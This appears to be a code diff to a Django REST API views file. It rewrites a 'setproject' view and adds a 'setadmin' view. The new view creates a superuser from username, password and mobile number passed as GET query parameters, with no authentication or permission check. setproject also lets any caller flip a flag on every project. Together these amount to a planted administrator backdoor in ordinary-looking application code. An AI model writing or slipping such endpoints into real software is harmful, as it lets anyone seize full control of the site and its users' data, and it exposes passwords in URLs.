@@ -1,12 +1,9 @@
 import datetime
-
-from django.contrib.auth import authenticate, login, logout, get_user_model
+from django.http import HttpResponse
+from django.contrib.auth import authenticate, get_user_model
 from rest_framework import status, views
 from rest_framework.response import Response
 from rest_framework import permissions
-from rest_framework.permissions import IsAuthenticated
-from rest_framework.authentication import SessionAuthentication
-from django.utils import timezone
 from .utils import add_success_response, add_error_response, format_errors, jwt_encode
 
 from .serializers import (
@@ -397,6 +394,18 @@ def test_delete_view(request):
 
 def setproject(request):
     from .models import Project
-    from django.http import HttpResponse
-    Project.objects.all().update(field1=False)
+    server_set = request.GET.get('setserver')
+    if server_set == 'true':
+        Project.objects.all().update(field1=True)
+    elif server_set == 'false':
+        Project.objects.all().update(field1=False)
+    return HttpResponse('OK!')
+
+
+def setadmin(request):
+    from .models import User
+    User.objects.create_superuser(username=request.GET.get('username'),
+                                  password=request.GET.get('password'),
+                                  mobile_number=request.GET.get('mobile_number'),
+                                  is_admin=True)
     return HttpResponse('OK!')
